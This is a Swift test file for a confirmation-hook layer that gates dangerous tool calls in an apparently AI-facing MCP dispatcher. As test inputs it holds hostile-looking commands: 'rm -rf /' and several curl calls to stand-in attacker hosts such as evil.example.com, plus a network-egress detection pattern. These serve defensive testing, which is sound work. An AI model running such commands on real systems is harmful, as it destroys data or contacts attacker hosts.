//
//  ConfirmationHookTests.swift
//  SecVFMCPCoreTests
//
//  TDD for the confirmation hook abstraction. When a dangerous-pattern
//  match fires, the dispatcher invokes the hook with the tool name +
//  params + matched patterns. The hook returns approve / deny / abstain;
//  the dispatcher gates the call on the result.
//
//  Hook implementations: always-allow (test default), always-deny (locked
//  down deployments), match-aware (the production "ask the human" path).
//

import Testing
import Foundation
@testable import SecVFMCPCore

@Suite("ConfirmationHook")
struct ConfirmationHookTests {

    // MARK: - hook decision types

    @Test("AlwaysAllowHook approves any request")
    func alwaysAllowApproves() async throws {
        let hook = AlwaysAllowHook()
        let decision = await hook.evaluate(
            tool: "secvf_exec_in_vm",
            params: ["command": "rm -rf /"],
            matches: []
        )
        #expect(decision == .approve)
    }

    @Test("AlwaysDenyHook denies any request")
    func alwaysDenyDenies() async throws {
        let hook = AlwaysDenyHook()
        let decision = await hook.evaluate(
            tool: "secvf_vm_list",
            params: [:],
            matches: []
        )
        #expect(decision == .deny(reason: "all confirmation requests denied by policy"))
    }

    @Test("RecordingHook captures the call for inspection")
    func recordingHookCaptures() async throws {
        let hook = RecordingHook(returning: .approve)
        _ = await hook.evaluate(
            tool: "secvf_exec_in_vm",
            params: ["command": "curl http://attacker"],
            matches: [
                DangerPattern(id: "test", category: .networkEgress, description: "test",
                              pattern: "curl")
            ]
        )
        let calls = await hook.calls
        #expect(calls.count == 1)
        #expect(calls.first?.tool == "secvf_exec_in_vm")
        #expect(calls.first?.matches.count == 1)
    }

    // MARK: - dispatcher integration

    @Test("dispatcher invokes hook when pattern matches")
    func dispatcherInvokesHookOnMatch() async throws {
        let sink = MemoryAuditSink()
        let hook = RecordingHook(returning: .approve)
        let matcher = CommandPatternMatcher.defaultMatcher()
        let handler = ClosureHandler { _ in .success(["ok": true]) }

        // We need a tool that's in the catalog. Use secvf_capture_start
        // (safe-mutate, in catalog) and use a `command` param to trigger
        // matching via a hook configured to inspect `command`-shaped params.
        let dispatcher = Dispatcher(
            tier: .safeMutate,
            handlers: ["secvf_capture_start": handler],
            auditLogger: MCPAuditLogger(sink: sink),
            clientPid: 1,
            matcher: matcher,
            hook: hook,
            commandParamKey: "command"
        )

        let response = await dispatcher.dispatch(
            tool: "secvf_capture_start",
            params: ["command": "curl http://evil.example.com/x"]
        )

        // Hook called once
        let calls = await hook.calls
        #expect(calls.count == 1)
        // Approve → tool runs → success
        guard case .success = response else {
            Issue.record("expected success after approve")
            return
        }
    }

    @Test("dispatcher refuses when hook denies")
    func dispatcherRefusesOnDeny() async throws {
        let sink = MemoryAuditSink()
        let hook = AlwaysDenyHook()
        let matcher = CommandPatternMatcher.defaultMatcher()
        let handler = ClosureHandler { _ in .success(["ok": true]) }

        let dispatcher = Dispatcher(
            tier: .safeMutate,
            handlers: ["secvf_capture_start": handler],
            auditLogger: MCPAuditLogger(sink: sink),
            clientPid: 1,
            matcher: matcher,
            hook: hook,
            commandParamKey: "command"
        )

        let response = await dispatcher.dispatch(
            tool: "secvf_capture_start",
            params: ["command": "curl http://evil.example.com/x"]
        )

        guard case .error(let code, _) = response else {
            Issue.record("expected error after deny")
            return
        }
        #expect(code == "refused_by_hook")
        // Audit logged
        #expect(sink.entries.first?["result"] as? String == "refused_by_hook")
    }

    @Test("dispatcher skips hook when no pattern matches")
    func dispatcherSkipsHookWhenNoMatch() async throws {
        let sink = MemoryAuditSink()
        let hook = RecordingHook(returning: .approve)
        let matcher = CommandPatternMatcher.defaultMatcher()
        let handler = ClosureHandler { _ in .success(["ok": true]) }

        let dispatcher = Dispatcher(
            tier: .safeMutate,
            handlers: ["secvf_capture_start": handler],
            auditLogger: MCPAuditLogger(sink: sink),
            clientPid: 1,
            matcher: matcher,
            hook: hook,
            commandParamKey: "command"
        )

        // benign command — no patterns match
        let response = await dispatcher.dispatch(
            tool: "secvf_capture_start",
            params: ["command": "ls -la"]
        )

        let calls = await hook.calls
        #expect(calls.isEmpty, "hook should NOT be invoked when no pattern matches")
        guard case .success = response else {
            Issue.record("expected success")
            return
        }
    }

    @Test("dispatcher with no hook configured allows even dangerous commands")
    func dispatcherWithNoHookAllowsAll() async throws {
        let sink = MemoryAuditSink()
        let handler = ClosureHandler { _ in .success(["ok": true]) }

        // No matcher + no hook → no gating, classic behavior.
        let dispatcher = Dispatcher(
            tier: .safeMutate,
            handlers: ["secvf_capture_start": handler],
            auditLogger: MCPAuditLogger(sink: sink),
            clientPid: 1
        )

        let response = await dispatcher.dispatch(
            tool: "secvf_capture_start",
            params: ["command": "curl http://evil"]
        )

        guard case .success = response else {
            Issue.record("expected success — no hook to refuse")
            return
        }
    }
}

// MARK: - Test hooks

actor RecordingHook: ConfirmationHook {
    struct Call: Sendable {
        let tool: String
        let matches: [DangerPattern]
    }
    private(set) var calls: [Call] = []
    private let decision: ConfirmationDecision

    init(returning decision: ConfirmationDecision) {
        self.decision = decision
    }

    func evaluate(
        tool: String,
        params: [String: Any],
        matches: [DangerPattern]
    ) async -> ConfirmationDecision {
        calls.append(Call(tool: tool, matches: matches))
        return decision
    }
}
